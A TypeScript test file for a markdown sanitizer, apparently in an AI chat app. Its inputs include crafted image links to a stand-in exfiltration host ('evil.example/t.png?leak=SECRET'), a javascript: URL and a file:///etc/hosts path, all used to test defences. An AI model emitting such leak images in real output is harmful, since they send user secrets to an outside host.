// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Max Boksem

import { Lexer, type Token } from "marked";
import { describe, expect, it } from "vitest";

import { color, font } from "../theme";
import {
	markdownPieces,
	markdownStyle,
	opensInBrowser,
	safeBlock as blockOf,
	WEB,
	withCaret,
} from "./markdown";

// What the native view gets.
const safeBlock = (source: string) => blockOf(source).markdown;

// The path or inline address of each picture a block draws, with its alt text.
const picturesIn = (source: string) =>
	blockOf(source).pictures.map(({ alt, source: where }) => [
		alt,
		where.access === "device" ? where.path : where.uri,
	]);

describe("opensInBrowser", () => {
	it("opens web links only", () => {
		expect(opensInBrowser("https://example.com/a")).toBe(true);
		expect(opensInBrowser("http://localhost:8080")).toBe(true);
		expect(opensInBrowser("HTTPS://EXAMPLE.COM")).toBe(true);
		for (const url of [
			"mailto:someone@example.com",
			"javascript:alert(1)",
			"file:///etc/hosts",
			"maxhq://open",
			"src/main.rs",
			"www.example.com",
			" https://example.com",
		]) {
			expect(opensInBrowser(url)).toBe(false);
		}
	});
});

describe("safeBlock", () => {
	it("leaves a block with no image or HTML as it is", () => {
		const block = "Some **bold**, `code` and a [link](https://example.com).\n";
		expect(safeBlock(block)).toBe(block);
		expect(safeBlock("1 < 2 and a <b>bold</b> word")).toBe("1 < 2 and a <b>bold</b> word");
	});

	it("shows an image as a link to it, named by its alt text", () => {
		expect(safeBlock('See ![a chart](https://example.com/c.png "Title") here.')).toBe(
			"See [a chart](<https://example.com/c.png>) here."
		);
		expect(safeBlock("![](https://example.com/c.png)")).toBe(
			"[Image](<https://example.com/c.png>)"
		);
		expect(safeBlock("![a *b* `c`\n[d]](u)")).toBe("[a b c \\[d\\]](<u>)");
		expect(safeBlock("![x](<a b>)")).toBe("[x](<a b>)");
		expect(safeBlock("![x](a\\>b)")).toBe("[x](<a\\>b>)");
	});

	it("keeps a ! before an image from making its link an image again", () => {
		const leak = "https://evil.example/t.png?leak=SECRET";
		expect(safeBlock(`!![a](${leak})`)).toBe(`\\![a](<${leak}>)`);
		expect(safeBlock(`!![](${leak})`)).toBe(`\\![Image](<${leak}>)`);
		expect(safeBlock(`# !![a](${leak})\n`)).toBe(`# \\![a](<${leak}>)\n`);
		expect(safeBlock(`- !![a](${leak})\n`)).toBe(`- \\![a](<${leak}>)\n`);
		expect(safeBlock(`> !![a](${leak})\n`)).toBe(`> \\![a](<${leak}>)\n`);
		expect(safeBlock(`~~!![a](${leak})~~`)).toBe(`~~\\![a](<${leak}>)~~`);
		expect(safeBlock(`| a |\n| - |\n| !![b](${leak}) |\n`)).toBe(
			`| a |\n| - |\n| \\![b](<${leak}>) |\n`
		);
		expect(safeBlock(`!![a](${leak}) !![b](${leak})`)).toBe(
			`\\![a](<${leak}>) \\![b](<${leak}>)`
		);
		expect(safeBlock(`wow!![a](${leak})`)).toBe(`wow\\![a](<${leak}>)`);
		expect(safeBlock(`!!![a](${leak})`)).toBe(`!\\![a](<${leak}>)`);
	});

	it("leaves a ! that is already escaped alone", () => {
		expect(safeBlock("\\!![a](u)")).toBe("\\![a](<u>)");
		expect(safeBlock("\\\\!![a](u)")).toBe("\\\\\\![a](<u>)");
	});

	it("never gives the native view an image, whatever comes before one", () => {
		const hasImage = (tokens: readonly Token[]): boolean =>
			tokens.some((token) => {
				if (token.type === "image") return true;
				if (token.type === "list") return hasImage(token.items);
				if (token.type === "table")
					return hasImage(
						[...token.header, ...token.rows.flat()].flatMap((cell) => cell.tokens)
					);
				return "tokens" in token && !!token.tokens && hasImage(token.tokens);
			});
		const leak = "https://evil.example/t.png?leak=SECRET";
		for (const block of [
			`!![a](${leak})`,
			`!![](${leak})`,
			`\\!![a](${leak})`,
			`\\\\!![a](${leak})`,
			`!!![a](${leak})`,
			`# !![a](${leak})`,
			`- !![a](${leak})`,
			`- one\n- !![a](${leak})\n- three`,
			`> !![a](${leak})`,
			`~~!![a](${leak})~~`,
			`**!![a](${leak})**`,
			`| a |\n| - |\n| !![b](${leak}) |`,
			`!![a](${leak}) !![b](${leak})`,
			`wow!![a](${leak})`,
			`!![a][r]\n\n[r]: ${leak}`,
			`[!![a](${leak})](https://example.com)`,
			`![!![a](${leak})](${leak})`,
		]) {
			expect(hasImage(Lexer.lex(safeBlock(block))), block).toBe(false);
		}
	});

	it("shows an image inside a link as its alt text", () => {
		expect(safeBlock("[![CI](https://example.com/b.svg)](https://github.com/owner/repo)")).toBe(
			"[CI](https://github.com/owner/repo)"
		);
	});

	it("finds an image in a quote, a list or a table, but not in code", () => {
		expect(safeBlock("> a ![b\n> c](u)\n")).toBe("> a [b c](<u>)\n");
		expect(safeBlock("1. x\n\n\t> ![a\n\t> b](u)\n")).toBe("1. x\n\n\t> [a b](<u>)\n");
		expect(safeBlock("| a |\n| - |\n| ![b](u) |\n")).toBe("| a |\n| - |\n| [b](<u>) |\n");
		expect(safeBlock("`![a](u)` and ![a](u)")).toBe("`![a](u)` and [a](<u>)");
		expect(safeBlock("```\n![a](u)\n```\n")).toBe("```\n![a](u)\n```\n");
	});

	it("shows an HTML block as its text, line by line", () => {
		expect(safeBlock('<div>\n<img src="https://example.com/p.png">\n</div>\n')).toBe(
			'\\<div\\>\\\n\\<img src\\=\\"https\\:\\/\\/example\\.com\\/p\\.png\\"\\>\\\n\\<\\/div\\>\n'
		);
		expect(safeBlock("- item\n\n  <div>\n  hi\n  </div>\n")).toBe(
			"- item\n\n  \\<div\\>\\\n  hi\\\n  \\<\\/div\\>\n"
		);
	});

	it("reads Windows line breaks", () => {
		expect(safeBlock("![a](u)\r\n")).toBe("[a](<u>)\n");
	});

	it("shows a block as text when it can't place an image", () => {
		expect(safeBlock("- a\n\t- ![x\n\t\ty](u)\n")).toBe(
			"\\- a\\\n\\- \\!\\[x\\\ny\\]\\(u\\)\n"
		);
	});
});

describe("safeBlock's pictures", () => {
	it("draws one on the device or in the text, and keeps the link in the text", () => {
		expect(picturesIn("See ![a chart](out/chart.png) here.")).toEqual([
			["a chart", "out/chart.png"],
		]);
		expect(safeBlock("See ![a chart](out/chart.png) here.")).toBe(
			"See [a chart](<out/chart.png>) here."
		);
		expect(picturesIn("![](data:image/png;base64,AAAA)")).toEqual([
			["", "data:image/png;base64,AAAA"],
		]);
		expect(picturesIn("![a](/tmp/a.png) and ![b](/tmp/b.jpg)")).toEqual([
			["a", "/tmp/a.png"],
			["b", "/tmp/b.jpg"],
		]);
	});

	it("never draws one on the web, a video or one that isn't a picture", () => {
		for (const block of [
			"![a](https://example.com/a.png)",
			"![a](//example.com/a.png)",
			"![a](out/clip.mp4)",
			"![a](out/notes)",
			"`![a](out/a.png)`",
			"```\n![a](out/a.png)\n```\n",
			"[a](out/a.png)",
		]) {
			expect(picturesIn(block)).toEqual([]);
		}
	});

	it("draws one that is a link's face, and keeps the link", () => {
		expect(picturesIn("[![a](out/a.png)](https://example.com)")).toEqual([["a", "out/a.png"]]);
		expect(blockOf("[![a](out/a.png)](https://example.com)").onlyPictures).toBe(false);
		expect(safeBlock("[![a](out/a.png)](https://example.com)")).toBe(
			"[a](https://example.com)"
		);
	});

	it("says when the pictures are all of it", () => {
		for (const block of ["![a](a.png)", "![a](a.png)\n", "![a](a.png) ![b](b.png)\n"]) {
			expect(blockOf(block).onlyPictures).toBe(true);
		}
		expect(blockOf("![a](a.png)\n![b](b.png)\n").onlyPictures).toBe(true);
		for (const block of [
			"Some text",
			"See ![a](a.png)",
			"- ![a](a.png)\n",
			"> ![a](a.png)\n",
			"![a](https://example.com/a.png)",
			"![a](a.png) ![b](https://example.com/b.png)",
		]) {
			expect(blockOf(block).onlyPictures).toBe(false);
		}
	});

	it("draws none in a block it shows as text", () => {
		const block = blockOf("- a\n\t- ![x\n\t\ty](u.png)\n");
		expect(block.pictures).toEqual([]);
		expect(block.onlyPictures).toBe(false);
	});

	it("draws one after a ! and keeps the ! from making its link an image", () => {
		expect(picturesIn("!![a](out/a.png)")).toEqual([["a", "out/a.png"]]);
		expect(safeBlock("!![a](out/a.png)")).toBe("\\![a](<out/a.png>)");
		expect(blockOf("!![a](out/a.png)").onlyPictures).toBe(false);
	});
});

describe("withCaret", () => {
	it("puts a bar after the last word", () => {
		expect(withCaret("Working on it")).toBe("Working on it ▍");
		expect(withCaret("Two lines\nand more  \n")).toBe("Two lines\nand more ▍");
	});

	it("leaves a closing fence and a table row as they are", () => {
		expect(withCaret("```ts\ncode\n```")).toBe("```ts\ncode\n```");
		expect(withCaret("~~~\ncode\n~~~\n")).toBe("~~~\ncode\n~~~");
		expect(withCaret("| a | b |\n| - | - |\n| 1 | 2 |")).toBe(
			"| a | b |\n| - | - |\n| 1 | 2 |"
		);
		expect(withCaret("$$\nx^2\n$$\n")).toBe("$$\nx^2\n$$");
	});
});

describe("markdownPieces", () => {
	it("gives a text's blocks, each fence whole", () => {
		expect(markdownPieces("# Title\n\nText.\n\n```ts\nconst a = 1;\n\nlet b;\n```\n")).toEqual([
			{ kind: "block", source: "# Title" },
			{ kind: "block", source: "Text." },
			{ kind: "block", source: "```ts\nconst a = 1;\n\nlet b;\n```\n" },
		]);
	});

	it("cuts display math out between the blocks around it", () => {
		expect(markdownPieces("Before.\n\nMore.\n\n$$\na\n\nb\n$$\n\nAfter.")).toEqual([
			{ kind: "block", source: "Before." },
			{ kind: "block", source: "More.\n" },
			{ kind: "math", tex: "a\n\nb", live: false },
			{ kind: "block", source: "After." },
		]);
	});

	it("keeps math that hasn't closed live, to the end", () => {
		expect(markdownPieces("Then:\n\n$$\nx^2 +")).toEqual([
			{ kind: "block", source: "Then:\n" },
			{ kind: "math", tex: "x^2 +", live: true },
		]);
	});

	it("leaves `$$` in a fence as code", () => {
		expect(markdownPieces("```\n$$\nx\n$$\n```")).toEqual([
			{ kind: "block", source: "```\n$$\nx\n$$\n```" },
		]);
	});
});

describe("markdownStyle", () => {
	it("sets quieter text smaller and in the colour asked for", () => {
		const quiet = markdownStyle(false, 0.5, 1, color.mutedForeground);
		expect(quiet.paragraph?.color).toBe(color.mutedForeground);
		expect(quiet.paragraph?.fontSize).toBe(12.5);
		expect(markdownStyle(false, 0.5, 1).paragraph?.color).toBe(color.foreground);
	});

	it("colors web links in a reply only", () => {
		const reply = markdownStyle(false, 0.5, 1);
		expect(reply.link).toEqual({ color: color.foreground, underline: false });
		expect(reply.linkVariants).toEqual({ [WEB]: { color: color.primary } });
		expect(markdownStyle(true, 0.5, 1).linkVariants).toBeUndefined();
	});

	it("sets code in the mono font", () => {
		const style = markdownStyle(false, 0.5, 1);
		expect(style.code?.fontFamily).toBe(font.mono);
		expect(style.codeBlock?.fontFamily).toBe(font.mono);
	});

	it("draws borders a hairline wide and grows the list gap with the text size", () => {
		const style = markdownStyle(false, 0.33, 1.5);
		expect(style.codeBlock?.borderWidth).toBe(0.33);
		expect(style.table?.borderWidth).toBe(0.33);
		expect(style.list?.gapWidth).toBe(18);
	});

	it("gives no undefined value, which would hide the view's default", () => {
		const undefinedAt = (value: unknown, path: string): string[] =>
			value === undefined
				? [path]
				: typeof value === "object" && value !== null
					? Object.entries(value).flatMap(([key, inner]) =>
							undefinedAt(inner, `${path}.${key}`)
						)
					: [];
		expect(undefinedAt(markdownStyle(false, 0.5, 1), "style")).toEqual([]);
		expect(undefinedAt(markdownStyle(true, 0.5, 1), "style")).toEqual([]);
	});

	it("takes every color from the theme", () => {
		const themed = new Set<string>([...Object.values(color), "transparent"]);
		const colors = (value: unknown): string[] =>
			typeof value === "object" && value !== null
				? Object.entries(value).flatMap(([key, inner]) =>
						typeof inner === "string" && /color$/i.test(key) ? [inner] : colors(inner)
					)
				: [];
		const used = colors(markdownStyle(false, 0.5, 1)).filter(
			(value) => !value.startsWith("rgba(")
		);
		expect(used.filter((value) => !themed.has(value))).toEqual([]);
	});
});
